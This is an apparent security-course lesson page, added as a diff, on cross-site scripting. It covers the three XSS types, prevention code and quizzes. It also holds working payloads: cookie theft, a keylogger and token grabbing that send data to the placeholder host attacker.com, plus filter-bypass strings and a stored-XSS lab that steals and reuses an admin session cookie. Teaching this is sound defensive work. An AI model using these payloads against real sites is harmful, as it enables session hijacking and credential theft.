@@ -1,0 +1,159 @@
+---
+title: Cross-Site Scripting (XSS)
+description: Injecting malicious scripts into web pages viewed by other users.
+---
+
+# Cross-Site Scripting (XSS)
+
+XSS is one of the most prevalent web vulnerabilities. It allows an attacker to inject malicious client-side scripts into web pages viewed by other users — effectively hijacking their browser session.
+
+## How XSS Works
+
+A web application is vulnerable when it takes user-supplied input and includes it in the page output **without proper sanitization or encoding**.
+
+```html
+<!-- Vulnerable search page -->
+<p>You searched for: <?php echo $_GET['q']; ?></p>
+
+<!-- Attacker's URL -->
+https://victim.com/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
+```
+
+The victim's browser sees the script tag as legitimate HTML and executes it.
+
+## Types of XSS
+
+### 1. Reflected XSS
+The payload is embedded in a URL or form and immediately reflected back in the response. It requires the victim to click a crafted link.
+
+- **Impact:** Session hijacking, credential theft, phishing
+- **Example:** Search bars, error messages, URL parameters
+
+### 2. Stored XSS (Persistent)
+The payload is saved in the server's database and served to every user who views the affected page. No crafted link needed.
+
+- **Impact:** Mass exploitation, worm propagation, defacement
+- **Example:** Comment sections, user profiles, forum posts
+
+<InfoBox type="warning">
+Stored XSS is far more dangerous than Reflected XSS. A single injection can compromise thousands of users automatically.
+</InfoBox>
+
+### 3. DOM-Based XSS
+The vulnerability exists entirely in client-side JavaScript. The server never sees the payload — the browser processes it directly from the URL fragment or local storage.
+
+```javascript
+// Vulnerable: reads from URL hash and writes to DOM
+const name = location.hash.slice(1);
+document.getElementById('greeting').innerHTML = "Hello, " + name;
+
+// Attack URL:
+// https://victim.com/page#<img src=x onerror=alert(document.cookie)>
+```
+
+## Common XSS Payloads
+
+```javascript
+// Basic alert (proof of concept)
+<script>alert(1)</script>
+
+// Cookie theft
+<script>fetch('https://attacker.com/?c='+document.cookie)</script>
+
+// Keylogger
+<script>document.onkeypress=function(e){fetch('https://attacker.com/?k='+e.key)}</script>
+
+// Session token grab
+<script>
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', 'https://attacker.com/steal?token=' + localStorage.getItem('authToken'));
+  xhr.send();
+</script>
+
+// Filter bypass: when <script> is blocked
+<img src=x onerror="alert(document.cookie)">
+<svg onload="alert(1)">
+<body onload=alert(1)>
+<a href="javascript:alert(1)">Click me</a>
+```
+
+## Bypassing XSS Filters
+
+Many applications try to filter XSS but fail. Common bypasses:
+
+| Filter | Bypass |
+|--------|--------|
+| Blocks `<script>` | `<img src=x onerror=alert(1)>` |
+| Blocks `alert` | `confirm(1)` or `prompt(1)` |
+| Encodes `"` | Use `'` instead |
+| Blocks `javascript:` | `JaVaScRiPt:` (case variation) |
+| Strips tags | `<<script>script>alert(1)<</script>/script>` |
+
+## Secure Coding: Prevention
+
+```javascript
+// VULNERABLE: innerHTML allows script execution
+element.innerHTML = userInput;
+
+// SECURE: textContent treats input as plain text
+element.textContent = userInput;
+
+// SECURE: DOMPurify sanitizes HTML
+element.innerHTML = DOMPurify.sanitize(userInput);
+```
+
+```php
+// VULNERABLE
+echo "Hello, " . $_GET['name'];
+
+// SECURE: htmlspecialchars encodes dangerous characters
+echo "Hello, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
+```
+
+<InfoBox type="tip">
+Always apply **output encoding** at the point of rendering, not just input validation. Data that's safe in one context (HTML body) may be dangerous in another (JavaScript string, HTML attribute, CSS).
+</InfoBox>
+
+## Lab: Cookie Theft via Stored XSS
+
+**Scenario:** A blog allows users to post comments. The comments are displayed to all visitors without sanitization.
+
+**Step 1:** Post a comment with the following payload:
+```html
+<script>
+  var img = new Image();
+  img.src = "https://attacker.com/steal?cookie=" + encodeURIComponent(document.cookie);
+</script>
+```
+
+**Step 2:** When an admin views the comments page, their browser executes the script and sends their session cookie to your server.
+
+**Step 3:** Use the stolen cookie to impersonate the admin:
+```
+Cookie: session=eyJhbGciOiJIUzI1NiJ9...
+```
+
+<TerminalWindow
+  title="Capturing Stolen Cookies"
+  command="python3 -m http.server 8080"
+  output='Serving HTTP on 0.0.0.0 port 8080...
+10.10.14.5 - - [GET /steal?cookie=session%3DeyJhbGci...] 200 -'
+/>
+
+<Quiz
+  question="Which type of XSS stores the payload in the server's database?"
+  answer="Stored XSS"
+  hint="Also called Persistent XSS — it affects every user who views the page."
+/>
+
+<Quiz
+  question="What JavaScript property is used to steal a user's session cookie?"
+  answer="document.cookie"
+  hint="It's where the browser stores all cookies for the current domain."
+/>
+
+<Quiz
+  question="Which HTML attribute can trigger JavaScript without a <script> tag?"
+  answer="onerror"
+  hint="Used with <img src=x onerror=...> — fires when the image fails to load."
+/>
